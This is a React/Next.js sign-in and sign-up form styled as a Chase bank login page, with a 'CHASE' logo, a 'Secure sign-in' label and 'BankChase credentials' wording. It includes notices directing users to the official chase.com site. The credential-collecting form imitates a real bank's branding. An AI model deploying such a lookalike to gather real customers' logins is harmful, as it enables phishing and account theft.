'use client'

import { useState } from 'react'
import { Fingerprint, ShieldCheck } from 'lucide-react'
import Link from 'next/link'
import { useRouter } from 'next/navigation'
import { authClient } from '@/lib/auth-client'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Card } from '@/components/ui/card'

export function AuthForm({ mode }: { mode: 'sign-in' | 'sign-up' }) {
  const router = useRouter()
  const [name, setName] = useState('')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)
  const [rememberUsername, setRememberUsername] = useState(false)
  const [biometricMessage, setBiometricMessage] = useState<string | null>(null)

  const isSignUp = mode === 'sign-up'

  const handleBiometric = () => {
    setBiometricMessage('Biometric sign-in is available when enabled on your device. Choose your saved passkey or biometrics prompt to continue.')
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError(null)
    setLoading(true)

    try {
      const response = isSignUp
        ? await authClient.signUp.email({ email, password, name })
        : await authClient.signIn.email({ email, password })

      if (response.error) {
        setError(response.error.message)
        setLoading(false)
        return
      }

      if (response.data?.user) {
        router.push(isSignUp ? `/verification?email=${encodeURIComponent(email)}` : '/')
        router.refresh()
      }
    } catch {
      setError('An unexpected error occurred')
      setLoading(false)
    }
  }

  return (
    <main className="min-h-svh bg-background flex flex-col items-center px-4 py-10 text-foreground">
      <header className="mb-16 flex items-center gap-2 text-primary">
        <div className="rounded-sm bg-primary px-3 py-1.5 text-xl font-semibold tracking-tight text-primary-foreground">CHASE</div>
        <span className="text-sm font-semibold text-primary">Secure sign-in</span>
      </header>
      <Card className="w-full max-w-sm rounded-none border border-border bg-card p-5 shadow-sm">
        <div className="mb-5">
          <h1 className="text-xl font-semibold tracking-tight text-foreground">
            {isSignUp ? 'Create your online account' : 'Sign in'}
          </h1>
          <p className="mt-1 text-xs leading-5 text-muted-foreground">
            {isSignUp
              ? 'Use BankChase credentials to create your account.'
              : 'Enter your username and password to continue.'}
          </p>
        </div>

        <form onSubmit={handleSubmit} className="flex flex-col gap-4">
          {isSignUp && (
            <div className="flex flex-col gap-2">
              <Label htmlFor="name">Name</Label>
              <Input
                id="name"
                value={name}
                onChange={(e) => setName(e.target.value)}
                required
                autoComplete="name"
              />
            </div>
          )}
          <div className="flex flex-col gap-2">
              <Label htmlFor="email" className="text-xs font-normal text-muted-foreground">Username or email</Label>
              <Input
                id="email"
                type="email"
                placeholder="Enter your username"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              autoComplete="email"
            />
          </div>
          {!isSignUp && (
            <label className="flex items-center gap-2 text-sm text-muted-foreground">
              <input type="checkbox" checked={rememberUsername} onChange={(e) => setRememberUsername(e.target.checked)} className="size-4 accent-primary" />
              Remember username on this device
            </label>
          )}
          <div className="flex flex-col gap-2">
            <Label htmlFor="password" className="text-xs font-normal text-muted-foreground">Password</Label>
            <Input
              id="password"
              type="password"
              placeholder="Enter your password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              minLength={8}
              autoComplete={isSignUp ? 'new-password' : 'current-password'}
            />
          </div>

          {error && (
            <p className="text-sm text-destructive" role="alert">{error}</p>
          )}
          {biometricMessage && (
            <p className="text-sm text-primary" role="status">{biometricMessage}</p>
          )}
          <Button type="submit" disabled={loading} className="w-full rounded-sm bg-[#1266b1] text-[#ffffff] hover:bg-[#0e5595]">
            {loading
              ? 'Please wait...'
              : isSignUp
                ? 'Create account'
                : 'Sign in'}
          </Button>
        </form>

        {!isSignUp && (
          <div className="mt-4 flex flex-col gap-3">
            <Link href="/reset-password" className="text-center text-sm text-primary underline-offset-4 hover:underline">Forgot username or password?</Link>
            <Button type="button" variant="outline" onClick={handleBiometric} className="w-full gap-2">
              <Fingerprint className="size-4" aria-hidden="true" />
              Use Face ID or fingerprint
            </Button>
            <p className="flex items-start gap-2 text-xs leading-5 text-muted-foreground">
              <ShieldCheck className="mt-0.5 size-4 shrink-0 text-primary" aria-hidden="true" />
              BankChase never asks for your SSN, Tax ID, card number, or Chase password here.
            </p>
          </div>
        )}

        <p className="mt-5 text-center text-xs leading-5 text-[#555555]">
          For Chase&apos;s official service, verify your browser shows <a href="https://www.chase.com" target="_blank" rel="noreferrer" className="font-medium text-[#1266b1] underline">https://www.chase.com</a>.
        </p>

        <div className="mt-6 border-t border-border pt-4 text-center">
          <p className="text-xs text-muted-foreground">
            Need Chase&apos;s official sign-in or enrollment page?
          </p>
          <div className="mt-2 flex justify-center gap-3 text-xs">
            <a href="https://www.chase.com/" target="_blank" rel="noreferrer" className="text-primary underline-offset-4 hover:underline">Chase.com</a>
            <a href="https://www.chase.com/digital/online-banking" target="_blank" rel="noreferrer" className="text-primary underline-offset-4 hover:underline">Chase enrollment</a>
          </div>
        </div>

        <p className="text-sm text-muted-foreground text-center mt-6">
          {isSignUp ? 'Already have an account? ' : "Don't have an account? "}
          <Link
            href={isSignUp ? '/sign-in' : '/sign-up'}
            className="text-foreground font-medium underline-offset-4 hover:underline"
          >
            {isSignUp ? 'Sign in' : 'Sign up'}
          </Link>
        </p>
      </Card>
    </main>
  )
}
